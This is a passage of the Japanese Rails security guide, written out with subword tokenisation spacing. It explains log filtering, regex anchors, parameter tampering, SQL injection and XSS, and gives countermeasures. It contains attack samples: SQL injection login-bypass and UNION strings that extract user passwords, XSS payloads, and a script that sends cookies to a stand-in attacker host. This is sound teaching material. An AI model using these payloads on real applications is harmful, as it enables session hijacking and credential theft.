▁しかし ログ ファイル には ログイン 情報 、 ク レ ジ ッ ト カ ー ド 番号 などの 情報 が含まれ ている こと がある ため 、 重 大 な セキュリティ 問題 の 原 因 になる ことがあります 。
▁Web アプリケーションの セキュリティ コ ン セ プ ト を デザイン する に あ たり 、 攻撃者が Web サーバー への フル アクセス を 成功 させ て し ま った 場合 の ことも 必ず 考 慮 に含め ておく 必要があります 。
▁ パスワード や 機 密 情報 が ログ ファイルに 平 文 の ま まで 出力 されて いて は 、 データベース 上で これらの 情報を 暗号化 して いて も 意味 が なく な ってしまいます 。
▁Rails アプリケーションの 設定 ファイル ▁config . filter _ parameters ▁ に ▁ _ 特定の リクエスト パラメータ を ログ 出力 時に フィルタ する _ ▁ 設定 を追加する ことができます 。
▁ フィルタ された パラメータ は ログ 内で ▁[ F I L T ER E D ] ▁という 文字 に置き換え られます 。
▁config . filter _ parameters ▁< < ▁: password
▁### ▁ よい パスワード
▁INFO : ▁ _ 思い 出 せ なく な った パスワード があります か 。
▁ パスワードを 書き 留 め たり しないでください 。 覚 え られ る 文 を 決 め 、 単 語 の 頭 文字 を 集 め た もの を パスワード に してください 。
▁その 結果 、 大 半 の パスワード が い とも 簡単に ク ラ ッ ク でき てしまう ことが 判 明 しました 。
▁ 最も あり が ち な 20 の パスワード は 以下の とおりです 。
▁ password 1 、 a b c 1 23 、 my space 1 、 password 、 b link 18 2 、 q w er t y 1 、 ** ** y o u 、 1 23 a b c 、 base b all 1 、 foo t b all 1 、 1 23 4 5 6 、 s o c c er 、 m on key 1 、 li ver p o ol 1 、 p r in c ess 1 、 j or d an 23 、 s li p k not 1 、 s up er ma n 1 、 il o ve y o u 1 、 m on key
▁なお 、 辞 書 に 載 っている 単 語 が そのまま 使われ ている ケース は こ の中で 4 % に 過 ぎ ず 、 ほとんど は 英 文字 に 数字 を 混 ぜ た もの になっている のは な か な か 興 味 深 い 点 です 。
▁しかし 、 パスワード ク ラ ッ ク 用の 辞 書 には こう した 膨 大 な パスワード が 集 め られ ており 、 攻撃者 は 英 文字 と 数字 の あらゆる 組み合わせ を 試 そう と しています 。
▁ 攻撃者が 標的ユーザー の ユーザー名 を 知 り 、 その ユーザーが 使用している パスワード が 弱 け れば 、 その アカウント は 簡単に ク ラ ッ ク され てしまいます 。
▁ よい パスワード の 条件 とは 、「 十分 に 長 く 」 「 英 文字 と 数字 が 使用 され ており 」 「 大文字 と 小文字 が 両方 使用されている 」 ことです 。
▁しかし そのような パスワード は 覚 え にくい ので 、 まず は ▁ _ 覚 え られ る 文 を 決 め 、 その 文 で 使用されている 単 語 の 頭 文字 を 集 め て パスワード にする _ ▁ ことをお勧めします 。
▁ The ▁ q u i c k ▁ br own ▁f o x ▁ j um p s ▁ o ver ▁the ▁ la z y ▁do g 」 という 文 なら たとえば 「 T q b f j o t l d 」 という パスワード に できます 。
▁もちろん 上 は あ く まで 例 に 過 ぎ ません 。 実際には このような あり ふ れ た 文 を パスワード に しないでください 。 この 程 度 の パスワード は ク ラ ッ キ ング 用 辞 書 に 収 録 されている 可能性があります 。
▁### ▁ 正規表現
▁INFO : ▁ _ Ruby の 正規表現 で 落 と し 穴 になり やすい のは 、 より 安全 な 「\ A 」 や 「\ z 」 がある ことを 知 らず に 危 険 な 「\ ^ 」 や 「 $ 」 を使って し ま う ことです 。
▁Ruby の 正規表現 では 、 文字列 の 最 初 や 最後に マッチ させる 方法 が 他の 言語 と 若 干 異なります 。
▁ このため 、 多くの Ruby 本 や Rails 本 でも この 点 に 誤 り が生じ ています 。
▁ い った い ど のような 問題が生じ る の でしょう か 。
▁たとえば 、 URL 形式 になっている かどうかを ざ っ く り と 検証 したい ので 、 以下のような 単純な 正規表現 を使用した とします 。
▁ / ^ https ? : \ / \ / [ ^ \ n ] + $ / i
▁これは 一部の 言語 では 正常に動作し ます 。
▁しかし 、 ▁ _ Ruby では 「\ ^ 」 と 「 $ 」 は 、 入力 全体 ではなく 、 ▁** 行 の ** ▁ 最 初 と 最 後 _ ▁ に マッチ し てしまいます 。
▁従って 、 この場合 以下のような 毒 入 り URL は フィルタ を 通 過 し てしまいます 。
▁ javascript : ex p lo it _ code ( ) ; / *
▁ http :// h i . com
▁上の URL が フィルタ に 引 っ か から ない のは 、 入力 の 2 行 目 に マッチ してしまう からです 。 従って 、 1 行 目 と 3 行 目 に どんな 文字列 が あって も フィルタ を 通 過 し てしまいます 。
▁ フィルタ を す り 抜 け て し ま った URL が 、 今度は ビュー の 以下の 箇所 で 表示 された とします 。
▁ link _ to ▁" Home page ", ▁@ user . home page
▁ 表示される リンク は 一 見 無 害 に 見え ます が 、 クリック すると 、 攻撃者が 送 り 込 んだ 邪 悪 な JavaScript 関数 を 初 め と する JavaScript コードが 実行 され てしまいます 。
▁これらの 正規表現 は 、 危 険 な 「\ ^ 」 や 「 $ 」 を 安全 な 「\ A 」 や 「\ z 」 に置き換え る必要があります 。
▁ / \ A https ? : \ / \ / [ ^ \ n ] + \ z / i
▁ 「\ ^ 」 や 「 $ 」 を使用し てしまう ミ ス は 何か と 発生 し やすい ので 、 正規表現 が 「\ ^ 」 で 始 ま った り 「 $ 」 で 終わっ ていた り すると フォーマット バ リ データ ▁( validates _ format _ of ) ▁ で 例外 が発生する ようになりました 。
▁ め った に ない と 思 わ れ ます が 、 「\ A 」 や 「\ z 」 の 代りに 「\ ^ 」 や 「 $ 」 を どう しても 使用 したい場合は 、 : m ulti line オプションを true に設定する こともできます 。
▁# ▁この 文字列 の どの 行 であっても " M e an w h il e " という 文字 が含まれ ている 必要があります 。
▁validates ▁: content , ▁ format : ▁ { ▁with : ▁ / ^ M e an w h il e $ / , ▁ m ulti line : ▁true ▁ }
▁この 方法は 、 フォーマット バ リ データ 使用 時に 起 き が ち な 間 違 い から 保 護 する ため だけ の ものです 。 「\ ^ 」 と 「 $ 」 は Ruby では ▁** 1 つの 行 ** ▁ に対して マッチ し 、 文字列 全体 に マッチ しない ということ を よく 理解 すること が 重要です 。
▁### ▁ 権限 昇 格
▁WARN ING : ▁ _ 1 つの パラメータ が変更され た だけで も 、 ユーザーが 不 正 な 権限 で アクセス できるように な っ てしまう ことがあります 。
▁ パラメータ は 、 たとえ ど れ ほど 難 読 化 し 、 隠 そう とも 変更 される 可能性 がある ことを 忘れ ない で ください 。
▁ 改 ざ ん される 可能性 が 高 い パラメータ と い えば id でしょう 。 ` http :// www . do main . com / pro j e ct /1 ` の 1 が id です 。
▁この id は コントローラの params を経由して 取得 できます 。
▁ コントローラ 内で は 、 次のような ことが 行われている 可能性があります 。
▁@ pro j e ct ▁= ▁ Pro j e ct . find ( params [: id ] )
▁Web アプリケーション によって は このコード でも 問題 はありません が 、 その ユーザーが すべての ビュー を参照 する 権限 がない 場合には 問題 となります 。
▁この ユーザーが URL の id を 4 2 に変更 し 、 本 来 の id では 表示 できない ページを 表示 できてしまいます 。
▁ このような ことに な らない よう 、 ▁ _ ユーザーの アクセス 権 も クエリ に含め てください _ ▁ 。
▁@ pro j e ct ▁= ▁@ current _ user . projects . find ( params [: id ] )
▁Web アプリケーション によって は 、 ユーザーが 改 ざ ん 可能な パラメータ が 他にも 潜 んで いる 可能性があります 。
▁ 経験 則 に 照 ら し 合わせ ても 、 ▁ _ 安全 が 確認 されていない ユーザー 入力 が 安全 であること は あり え ず 、 ユーザー から 送信 される ど のような パラメータ にも 、 何らかの 操作 が 加 え られ ている 可能性 は 常に あります _ ▁ 。
▁ 難 読 化 と JavaScript による 検証 の セキュリティ だけで 安全 を 保 て ると 考え て は なり ません 。
▁ M o z il la ▁ Firefox の Web ▁D e ve lo per ▁ To ol bar を使用すれば 、 フォームの 隠 し フィールド を見つけ て 変更 することができます 。
▁ _ JavaScript を使用して ユーザーの 入力 データ を検証する ことは できます が 、 攻撃者が 想 定 外 の値 を与えて 邪 悪 な リクエストを 送信 すること は 阻 止 できません _ ▁ 。
▁ M o z il la ▁ Firefox 用の L ive ▁ HTTP ▁ H e ad er s プラグイン を使用すると 、 すべての リクエストを ログ に 記 録 して 、 それら を 繰り返し 送信 したり 変更 したり することができます 。
▁さらに 、 JavaScript による 検証 は JavaScript をオフに す れ 簡単に バ イ パス できてしまいます 。
▁ クライアント 側 に 、 クライアント から の リクエスト や イン ター ネ ッ ト から の 応答 を 傍 受 している プロキシ が 介 在 している 可能性 も 忘れ ないように しておく必要があります 。
▁ インジェクション
▁---------
▁INFO : ▁ _ インジェクション ▁( 注 入 ) ▁ とは 、 Web アプリケーションに 邪 悪 な コード や パラメータ を導入し て 、 その とき の セキュリティ 権限 で 実行 させる ことです 。
▁ XSS ▁( ク ロ ス サイト ス ク リ プ テ ィ ング ) ▁ や SQL インジェクション は インジェクション の 顕 著 な 例 です 。
▁ インジェクション は 、 それ によって 注 入 される コード や パラメータ が 、 ある コンテキスト では 有 害 であっても 、 それ以外の ほとんど の コンテキスト では 無 害 である という 点 で 非常に ト リ ッ キー である と 言 え ます 。
▁ここで い う コンテキスト とは 、 ス ク リ プ テ ィ ング 、 クエリ 、 プログラミング 言語 、 シ ェ ル 、 Ruby や Rails の メソッド など があります 。
▁以下の 節 では 、 インジェクション 攻撃 が発生し う る 重要な コンテキスト について説明し ます 。
▁ただし 最初の 節 では 、 インジェクション の 際 の 接続 方法 における アーキテクチャ 上の 決 定 事 項 について説明し ます 。
▁### ▁ ホワイトリスト と ブラックリスト
▁NOT E : ▁ _ サ ニ タ イ ズ 、 保 護 、 検証 では 、 通常 ホワイトリスト の 方が ブラックリスト よりも 使用されます 。
▁ 悪 事 に 使われ る メールアドレス 、 非 公式 の アクション 、 邪 悪 な HTML タグ など について ブラックリスト が 作成される ことがあります 。
▁ ホワイトリスト は これ と 対 を 成 す もの で 、 悪 事 に 使われ ないこと が わ か っている メールアドレス 、 公式 の アクション 、 無 害 な メールアドレス など を ホワイトリスト に することができます 。
▁ ス パ ム フィルタ など 、 対象 によって は ホワイトリスト を作成し よう がない もの もあります が 、 ▁ _ 基本的に は まず ホワイトリスト が使用されます _ ▁ 。
▁* ▁ before _ action では 、 except : ▁[ ... ] ではなく only : ▁[ ... ] を使用して ください 。
▁その 方が 将来 コントローラに アクション が追加され た場合 に 、 その アクション をオフに する の を 忘れ ずに 済み ます 。
▁* ▁ ク ロ ス サイト ス ク リ プ テ ィ ング ▁( XSS ) ▁ 対策 として 、 & lt ; script & g t ; を削除する の ではなく & lt ; strong & g t ; を 許可 してください 。
▁詳細については 、 下 記 を参照してください 。
▁* ▁ ブラックリスト に 引 っ か か った ユーザー 入力 データを コード で 修正 して 使用 しないでください 。
▁* ▁ そのような ことを すると 、 " & lt ; sc & lt ; script & g t ; ri p t & g t ; ". g sub (" & lt ; script & g t ; ", ▁" ") という 攻撃 が 成 立 し てしまいます 。
▁* ▁ ブラックリスト に 引 っ か か った 入力 は 受け 付け ない で ください 。
▁ 特定の 項目 だけ を 許可 する ホワイトリスト ア プロ ー チ は 、 特定の 項目 だけ を 禁 止 する ブラックリスト ア プロ ー チ に 比 べ て 、 ブラックリスト への 禁 止 項目 の 追加 忘れ が 原 理 的に 発生 し ないので 、 望 ま しい 方法 である と 言 え ます 。
▁### ▁ SQL インジェクション
▁INFO : ▁ _ メソッドの 改良 が 進 んだ おかげで 、 SQL インジェクション が Rails アプリケーションで 問題 になる ことは め った に なく なりました 。
▁しかし SQL インジェクション は ひ と た び 発生 すれば 壊 滅 的な 打 撃 を 受け る 可能性 があり 、 Web アプリケーション に対する 一般的な 攻撃 方法 でも ある ため 、 この問題 を 十分 に 理解 すること が 重要です 。
▁#### ▁ は じ め に
▁ SQL インジェクション は 、 Web アプリケーションの パラメータ を 操作 して データベース クエリ に 影 響 を与える ことを 目的 と した 攻撃 手法 です 。
▁ SQL インジェクション は 、 認 証 を バ イ パス する 目的 で よく 使用されます 。
▁ 他にも 、 データを 操作 したり 任意の データを 読み出し たり する 目的 にも 使用されます 。
▁ クエリ のユーザー 入力 データを そのまま 使用 せずに 改 ざ ん する方法 の例 を 以下 で説明します 。
▁ Pro j e ct . where (" name ▁= ▁' # { params [: name ]} ' ")
▁上のコードは 検索 用の アクション など で 使われ る もの であり 、 ユーザー は 検索 したい プロジェクト 名を 入力 します 。
▁ここで 、 悪意のある ユーザーが 「 ' ▁OR ▁1 ▁-- 」 という 文字列 を入力する と 、 以下の SQL クエリ が 生成されます 。
▁ SELECT ▁* ▁FROM ▁ projects ▁WHERE ▁name ▁= ▁' ' ▁OR ▁1 ▁-- '
▁2 つの ダ ッ シ ュ 「 - - 」 が 末尾 に置かれ ると 、 以後 に追加 される クエリ が すべて コメント と 見 な され てしまい 、 実行 され なくなります 。
▁ そのため 、 projects テーブル から すべての レコード が 取り 出 されます 。 これらは 通常の ユーザー から は 参 照 できない は ず の ものです 。
▁これは 、 クエリ で すべての 条件 が true になっている ために 発生 しています 。
▁#### ▁ 認 証 の バ イ パス
▁Web アプリケーション には 、 何らかの 形 で アクセス 制 御 が行われ る のが普通です 。
▁ ユーザーが ログイン 情報 を入力する と 、 Web アプリケーション は ユーザー テーブル に 登録 されている レコード と マッチする かどうか を調べ ます 。
▁ 既存の レコード と マッチする 場合 、 アプリケーション は アクセス を 許可 します 。
▁しかし ながら 、 攻撃者が SQL インジェクション を使用することで この 認 証 を す り 抜 け てしまう 可能性があります 。
▁ 以下 は Rails における 典 型 的な データベース クエリ です 。 ユーザーが 入力 した ログイン 情報 パラメータ と マッチする User テーブル 上の 最初の レコード を返します 。
▁User . first (" login ▁= ▁' # { params [: name ]} ' ▁ AND ▁ password ▁= ▁' # { params [: password ]} ' ")
▁ここで 攻撃者が 「 ' ▁OR ▁' 1 ' =' 1 」 という 文字列を 名前 フィールド に 入力 し 、「 ' ▁OR ▁' 2 ' > ' 1 」 を パスワード フィールド に 入力 すると 以下の SQL クエリ が 生成されます 。
▁ SELECT ▁* ▁FROM ▁ users ▁WHERE ▁ login ▁= ▁' ' ▁OR ▁' 1 ' =' 1 ' ▁ AND ▁ password ▁= ▁' ' ▁OR ▁' 2 ' > ' 1 ' ▁LIMIT ▁1
▁ マッチする 最初の レコード が この クエリ によって 取得 され 、 ユーザー にアクセス が 許可 され てしまいます 。
▁#### ▁ 不 正 な データ 読み出し
▁ U N I ON 文 は 2 つの SQL クエリ を つ な ぎ 、 1 つの セット として データ を返します 。
▁ 攻撃者 は U N I ON を使用して データベースから 任意の データを 読み 出 す 可能性があります 。
▁ 再 び 上の 例 を使用して 説明します 。
▁ここで 、 U N I ON 文 を使用した 以下の 文字列を 注 入 した とします 。
▁ ') ▁ U N I ON ▁ SELECT ▁id , login ▁A S ▁name , password ▁A S ▁ de script ion , 1 , 1 , 1 ▁FROM ▁ users ▁--
▁これ によって 以下の SQL が 生成されます 。
▁ SELECT ▁* ▁FROM ▁ projects ▁WHERE ▁( name ▁= ▁' ') ▁ U N I ON
▁ SELECT ▁id , login ▁A S ▁name , password ▁A S ▁ de script ion , 1 , 1 , 1 ▁FROM ▁ users ▁-- '
▁この クエリ で 得られ る のは プロジェクト の リスト ではなく ( 名前 が 空 欄 の プロジェクト は ないので ) 、 ユーザー名 と パスワード の リスト です 。
▁ データベース 上の パスワード が 暗号化 され ていれば まだ 最 悪 の 事 態 は 避 け られます 。
▁ 一方 、 攻撃者 にとって 気 が か り な のは 、 両方 の クエリ で カラム の 数 を 同じ に し なければならない ということです 。
▁この 攻撃 用 文字列 では 、 そのため に 2 番目の クエリ に 「 1 」 を 連 続 して 配置 しています 。 これらの 値 は 常に 1 になる ので 、 1 番目の クエリ の カラム 数 と 一 致 します 。
▁ 同様に 、 2 番目の クエリ では A S を使用して カラム 名を リ ネ ー ム しています 。 これにより 、 ユーザー テーブル から 取り出し た 値が Web アプリケーション 上で 表示 されます 。
▁Rails を [ 最 低 でも 2.1 . 1 に アップ デ ート ]( http :// www . r or security . info / 200 8 / 0 9 / 08 / sql - in j ec tion - issue - in - limit - and - of f set - param e ter / ) してください 。
▁#### ▁ 対応策
▁Ruby ▁on ▁Rails には 、 特殊な SQL 文字 を フィルタ する 仕組み が ビルトイン で 備 わ っています 。 「 ' 」 「 " 」 NULL 、 改 行 が エスケープ されます 。
▁ 条件 オプション には 文字列 を直接 渡す 代りに 、 以下のように 配列 を 渡す ことで 、 汚 染 された 文字列を サ ニ タ イ ズ することもできます 。
▁ Model . where (" login ▁= ▁ ?
▁ AND ▁ password ▁= ▁ ? ", ▁ ent er ed _ user _ name , ▁ ent er ed _ password ). first
▁ 上 に示したように 、 配列 の最初の 部分 が SQL フラグ メ ン ト になっ ており 、 その 中に 疑問符 「 ? 」 が 含まれています 。
▁ サ ニ タ イ ズ された 変数 は 、 配列 の 後 半 に置かれ ており 、 フラグ メ ン ト 内の 疑問符 を 置き換え ます 。
▁ ハッシュ を渡して 同じ 結果 を得る こともできます 。
▁ Model . where ( login : ▁ ent er ed _ user _ name , ▁ password : ▁ ent er ed _ password ). first
▁ モデルの インスタンス では 、 配列 または ハッシュ のみ が 使用できます 。
▁ 他の 場所 で ` sanitize _ sql ( ) ` を使って み る こともできます 。
▁ _ SQL で 外部 の 文字列を 、 サ ニ タ イ ズ せずに 使用する と セキュリティ 上 重 大 な 結果 が も たら される 可能性 がある ことを 普 段 から 考え る 習慣 を つ け ましょう _ ▁ 。
▁### ▁ ク ロ ス サイト ス ク リ プ テ ィ ング ▁( XSS )
▁INFO : ▁ _ XSS は 最も よく 発生 し する Web セキュリティ上の 脆弱性 であり 、 ひ と た び 発生 すると 壊 滅 的な 影 響 が 生じる 可能性があります 。
▁ XSS を使用した 悪意のある 攻撃 が行われ ると 、 クライアント 側 の コンピュータ に 実行 可能な コードが 注 入 され てしまいます 。
▁Rails には 、 このような 攻撃 を か わ す ための ヘルパーメソッド が 用意されてい ます 。
▁#### ▁ 攻撃 点
▁ 攻撃 点 ▁( ent ry ▁ p o in t ) ▁ とは 、 攻撃者が 攻撃 を 向け る 対象 となる 、 脆 弱 な URL および パラメータ の ことです 。
▁ 攻撃 点 として 最も 選 ば れ やすい のは メッセージ 投 稿 、 ユーザー コメント 、 ゲ スト ブ ッ ク ですが 、 プロジェクト タイトル 、 ドキュメント 名 、 検索 結果 ページ など も同様に 脆弱性 を 抱 え ていた こと があり ました 。 ユーザーが データを 入力 可能な ところ は ど こ でも 攻撃 点 になり え ます 。
▁ただし 、 攻撃者が データ を入力する のは Web サイト 上の 入力 ボックス とは 限 り ません 。 URL に 含 まれ ている パラメータ 、 URL に 直接 含 まれ ていない が 使用 可能な 「 隠 れ た 」 パラメータ 、 URL に 含 まれ ない 内部 パラメータ の ど こ から でも 攻撃者が データ を入力する 可能性があります 。
▁ 攻撃者が すべての ト ラ フ ィ ッ ク を 傍 受 している 可能性 を 常に 考 慮 に 入 れる 必要があります 。
▁ Firefox の [ L ive ▁ HTTP ▁ H e ad er s プラグイン ]( http :// l ive http header s . m o z de v . org / ) や クライアント 側 で の プロキシ を使用することで 、 リクエスト を簡単に 改 ざ ん することができます 。
▁ XSS 攻撃 は 次のように 行われます 。 攻撃者が 何らかの コードを Web アプリケーションに 注 入 し 、 後に 標的ユーザー の Web ページ 上 に 表示 されます 。
▁ 多くの XSS の例 では 、 単 に 警 告 ボックス を表示する だけです が 、 実際の XSS 攻撃 は もっと 凶 悪 です 。
▁ XSS を使用することで 、 cookie の 盗 み 出 し 、 セッション の ハイジャック 、 標的ユーザー を 偽 の Web サイトに 誘 い 込 む 、 攻撃者 の 利 益 になる ような 広 告 を表示する 、 Web サイトの 要素 を 書き 換 え て ユーザー情報 を 盗 み 出 したり Web ブラウザ の セキュリティ ・ ホ ー ル を経由して 邪 悪 な ソフトウェア を インストール したり できる ことがあります 。
▁20 07 年 後 半 、 M o z il la ブラウザで 88 の 脆弱性 、 S a fa ri で 22 、 I E で 18 、 O per a で 12 の 脆弱性 が 報 告 されました 。
▁[ S y ma n te c ▁ G lo b al ▁ In ter net ▁S ec ur ity ▁ th re at ▁ re port ]( http :// eval . s y ma n te c . com / m k t g info / ent er p ri s e / w h it e _ p a per s / b - w h it e p a per _ in ter net _ security _ th re at _ re port _ x i i i _ 04 - 200 8 . en - us . p d f ) ▁ には 、 200 7 年 後 半 に ブラウザ の プラグイン で 23 9 の 脆弱性 が 報 告 されています 。
▁[ M p ack ]( http :// p and al a b s . p and a security . com / m p ack - un co ver ed / ) は 大 変 活 発 かつ 最新の 攻撃 用 フレームワーク であり 、 これらの 脆弱性 を使用しています 。
▁ 犯罪 的な ハ ッ カ ー にとって 、 Web アプリケーション フレームワーク の SQL インジェクション の 脆弱性 に つ け 込 み 、 テキスト テーブル の カラム に 凶 悪 な コードを 注 入 して 回 る のは た ま らない 魅 力 です 。
▁20 08 年 4 月 には 、 5 10 , 000 以上 の Web サイト が この 方法で ハ ッ キ ング され 、 英 国 政府 、 国 連 など 多くの 重要な サイト が 被 害 に 遭 い ました 。
▁ バ ナ ー 広 告 は 、 比 較 的 目 新しい 攻撃 点 です 。
▁[ T r end ▁ M i c r o ]( http :// blog . tr end m i c r o . com / my space - ex c it e - and - b li c k - s er ve - up - ma li c io us - b an n er - ad s / ) による と 、 200 8 年 初 頭 に 、 M y S p a ce や E x c it e などの 有 名 サイトの バ ナ ー 広 告 に 悪意のある コードが 仕 込 まれ た という 事 例 があり ました 。
▁#### ▁ HTML / JavaScript インジェクション
▁ XSS 攻撃 に 利用 され やすい 言語 は 、 言 う まで も なく クライアント 側 で 最も 普 及 している 言語 である JavaScript であり 、 し ば し ば HTML と 組み合わせ て 攻撃 に 使用されます 。 ▁ _ 攻撃 を避ける には ユーザー 入力 を エスケープ する _ ▁ 必要があります 。
▁ XSS をチェックする 最も 簡単な テストを ご 紹 介 します 。
▁< script > alert (' Hello ') ; </ script >
▁この JavaScript コード を実行すると 、 警 告 ボックス が 1 つ 表示される だけです 。
▁ 次の 例 では 、 見 かけ の動作 は まったく 同じです が 、 通常 では あり え ない 場所 に コードが 置 か れ ています 。
▁< im g ▁src = javascript : alert (' Hello ') >
▁< table ▁ b ack g r ound =" javascript : alert (' Hello ') ">
▁#### # ▁C oo k i e 窃 盗
▁ 先ほど の例 では 何 の 害 も 生 じ ないので 、 今度は 攻撃者が ユーザーの cookie を 盗 み 出 す 手法 を ご 紹 介 します ▁( 攻撃者 は これ を使用して ユーザーの セッション を ハイジャック します )。
▁ JavaScript では 、 document . cookie プロ パ テ ィ を使用して ドキュメント の cookie を 読み 書き できます 。
▁ JavaScript では 同 一 生成 元 ポ リ シ ー が 強 制 的 に適用 されます 。 これは 、 ある ドメイン から 送 り 込 まれ た スクリプト から は 、 別の ドメイン の cookie にアクセス できない ように する ポ リ シ ー です 。
▁ document . cookie プロ パ テ ィ には 、 生成 元 web サーバー の cookie が 保存 されています 。
▁しかし 、 HTML ドキュメント に 直接 コードを 埋 め 込 む と ( XSS によって これ が 生じる ことがあります ) 、 この プロ パ テ ィ を 読み 書き できてしまいます 。
▁この コードを 自分の Web アプリケーションの 適 当 な 場所 に 手動で 注 入 すると 、 その ページに 含 まれ ている 自身 の cookie が表示される の が わかり ます 。
▁< script > document . write ( document . cookie ) ; </ script >
▁もちろん 、 攻撃者 に して み れば 標的ユーザー が 自分 で 自分の cookie を表示し た ところで 何 の 意味 も ありません 。
▁ 次の 例 では 、 http :// www . a tt ack er . com / ▁という URL から 画像 と cookie を 読み込み ます 。
▁ 言 う まで も ありません が 、 この URL は 実際には 存 在 しません ので 、 ブラウザ には 何も 表示 されません ( 訳 注 : ▁ 現在 は 売 り 物 件 の Web ページ がある よう です )。
▁ただし 攻撃者 は Web サーバー の アクセス ログ ファイル を調べ て 標的ユーザー の cookie を参照 することができます 。
▁< script > document . write (' < im g ▁src =" http :// www . a tt ack er . com / ' ▁+ ▁ document . cookie ▁+ ▁' "> ') ; </ script >
▁ www . a tt ack er . com ▁ サイト 上の ログ ファイル には 以下のように 記 録 されます 。
▁GET ▁ http :// www . a tt ack er . com / _ app _ session = 8 3 6 c 1 c 2 5 27 8 e 5 b 3 2 1 d 6 b e a 4 f 19 c b 5 7 e 2
▁ HTTP ▁ only ▁ cookie は I E ▁ v 6 から 使用できます 。
▁S P 1 , ▁ Firefox ▁ v 2 . 0.0 . 5 ▁and ▁ O per a ▁ 9 . 5 . ▁S a fa ri はまだ この フラグ を 検 討 中 であり 、 この オプションは 無視 されます 。
▁ただし Web T V や Mac 版 I E ▁5 . 5 などの 古 い ブラウザで は 、 ページ 上で の 読み込み に 失敗 します 。
▁#### # ▁Web ページの 汚 損
▁Web ページを 書き 換 え る ▁( 汚 損 ) ▁ ことで 、 偽 の 情報を 表示 したり 、 標的ユーザー を 攻撃者 の 偽 サイトに 誘 い 込 んで cookie や ログイン 情報 などの 重要 データを 盗 み 出 す などの さまざまな 攻撃 が 可能 になります 。
▁ 最も 多 い 攻撃 は 、 if r am e を使用して 外部 の コードを Web ページ に含め る 方法 です 。
▁< if r am e ▁name =" S t at P age " ▁src =" http :// 5 8 . x x . x x x . x x x " ▁ w id th = 5 ▁ h e ig h t = 5 ▁ style =" d is p la y : n one " ></ if r am e >
▁ このコード によって 、 外部 にある 任意の HTML や JavaScript が 読み込まれ 、 Web サイト の一部 として 埋 め 込 まれ ます 。
▁上の if r am e は 、[ M p ack 攻撃 フレームワーク ]( http :// is c . s an s . org / d i ary . html ? s to ry id = 30 15 ) を使用して イ タ リ ア にある Web サイト への 攻撃 で 実際に 用 い られ た ものです 。
▁ M p ack は Web ブラウザ の セキュリティ ホ ー ル を 介 して 邪 悪 な ソフトウェア を インストール し よう とします 。 そして 攻撃 の 成功 率 は 50 % を 誇 っています 。
▁さらに 専 門 的な 攻撃 として は 、 Web サイト 全体 を 上 に 重 ね て 表示 したり ログインフォーム を表示し たり する という の があります 。 これらは 元の サイト と 一 見 そ っ く り ですが 、 入力 された ユーザー名 と パスワードを 密 か に 攻撃者 の サイトに 送信 します 。
▁ あるいは 、 CSS や JavaScript を 駆 使 して Web アプリケーション 上の 本 物 の リンクを 隠 して 別の リンク を表示し 、 ユーザーを 偽 の サイトに リダイレクト する という 手法 もあります 。
▁ リ フ レ ク ション インジェクション ▁( Re f le ct ed ▁in j ec tion ) ▁ 攻撃 も 同様 の 攻撃 です 。 標的ユーザー に 後 で 表示される ペ イ ロー ド が 保存 されて お らず 、 実際には URL に 長 大 な 文字列 として 仕 込 まれ ています 。
▁以下の リンク 先に は 、「 ジ ョ ー ジ ・ ブ ッ シ ュ が 議 長 に 9 歳 の 男 の 子 を 任 命 」 と 書かれ た ページ があり ました 。
▁ http :// www . c b s new s . com / st or ies / 200 2 / 0 2 / 15 / w e at her _ local / main 50 1 64 4 . s html ? z ip code = 1 - - >
▁< script ▁src = http :// www . security la b . r u / test / sc . js ></ script >< ! - -
▁#### ▁ 対応策
▁ _ 悪意のある 入力 を フィルタ すること が き わ め て 重要です 。 Web アプリケーションの 出力 を エスケープ すること も同様に 重要です _ 。
▁ 特に XSS の場合 、 _ ブラックリスト ではなく ホワイトリスト に 基 づ いた 入力 フィルタ を 実 施 すること が 絶 対 重要です _ 。
▁ ホワイトリスト フィルタ では 特定の 値 のみ が 許可 され 、 それ以外の 値 はすべて 拒 否 されます 。
▁ ブラックリスト を元に している 限 り 、 必ず 将来 漏 れ が生じ ます 。
▁ユーザー 入力 から 「 script 」 という 文字 を 除 去 するのに 使用されている ブラックリスト がある と しましょう 。
▁ それ なら 攻撃者 は 次に は 「 & lt ; sc r script ip t & g t ; 」 という 文字 を入力する でしょう 。 この 文字 が フィルタ される と 「 & lt ; script & g t ; 」 という 文字 が 残 ってしまいます 。
▁ 以前の Rails では strip _ tag s ( ) 、 strip _ links ( ) 、 sanitize ( ) メソッドで ブラックリスト 的 ア プロ ー チ が 使用 され ていました 。
▁従って 、 当 時 は 以下のような 攻撃 が 可能 になっ ていました 。
▁ strip _ tag s (" some < < b > script > alert (' hello ' )< </ b > / script > ")
▁ フィルタ から 返される 「 " some & lt ; script & g t ; alert (' hello ') & lt ; / script & g t ; 」 という 文字列 の 攻撃 能 力 は 温 存 されています 。
▁ tag s ▁= ▁% w ( a ▁a c r on y m ▁ b ▁ strong ▁ i ▁ e m ▁ li ▁ ul ▁ ol ▁ h 1 ▁ h 2 ▁ h 3 ▁ h 4 ▁ h 5 ▁ h 6 ▁ block q u o te ▁ br ▁c it e ▁ sub ▁ s up ▁in s ▁ p )
▁ s ▁= ▁ sanitize ( user _ input , ▁ tag s : ▁ tag s , ▁ attributes : ▁% w ( href ▁ title ) )
▁この 方法 なら 指定された タグ のみ が 許可 される ため 、 あらゆる 攻撃 方法 や 邪 悪 な タグ に対して フィルタ が 健 全 に 機能 します 。
▁ 第 2 段 階 として 、 ▁ _ Web アプリケーション から の 出力 を も れ なく エスケープ する _ ▁ ことが 優 れ た 対策 となります 。 これは 特に 、 ユーザー 入力 の 段 階 で フィルタ され なかった 文字列 が Web 画面 に 再 表示 され てしまう ようなこと が あった 場合に 有効 です 。
▁ _ ` es ca p e HTML ( ) ` ▁( または 別 名 の ` h ( ) ` ) ▁ メソッド _ ▁ を使用して 、 HTML 入力 文字 「 & am p ; 」 「 & q u o t ; 」 「 & lt ; 」 「 & g t ; 」 を 、 無 害 な HTML 表現 形式 ( ` & am p ; `、` & q u o t ; `、` & lt ; `、` & g t ; ` ) ▁ に置き換え ます 。
▁S a f e E rb は 、 外部 入力 された 文字列を エスケープ する よう 通知 してくれます 。
▁#### # ▁ 攻撃 の 難 読 化 と エ ン コ ー デ ィ ング インジェクション
▁ 従来 の ネットワーク ト ラ フ ィ ッ ク は 西欧 文 化 圏 の ア ル フ ァ ベ ッ ト が ほとんど で した が 、 それ以外の 言語 を 伝 え るために U n i code などの 新しい エンコード 方 式 が 使用される よう になっ てきました 。
